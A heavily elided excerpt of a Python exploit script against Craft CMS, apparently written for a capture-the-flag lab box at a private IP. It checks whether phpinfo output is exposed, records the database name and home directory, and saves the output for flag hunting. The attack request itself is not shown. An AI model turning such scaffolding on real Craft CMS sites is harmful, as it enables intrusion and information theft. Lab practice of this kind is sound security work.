...
class CraftCMSExploit:
    ...
    def exploit(self):
        result = {'url': self.url, 'vulnerable': False, 'db_name': None, 'home_dir': None, 'error': None}
        try:
            ...
            if 'PHP Version' in response.text and 'PHP License' in response.text:
                ...
                # Extract full phpinfo for flag hunting
...
def process_url(url):
    try:
        if not url.startswith('http'):
            url = 'http://' + url
        print(f"[*] Testing {url}")
        # Determine if we need a custom Host header
        host_header = None
        if 'orion' in url.lower() or '10.129.54.140' in url:
            # Target via IP with Host header
        ...
        if result['vulnerable']:
            ...
            # Save phpinfo output for flag extraction
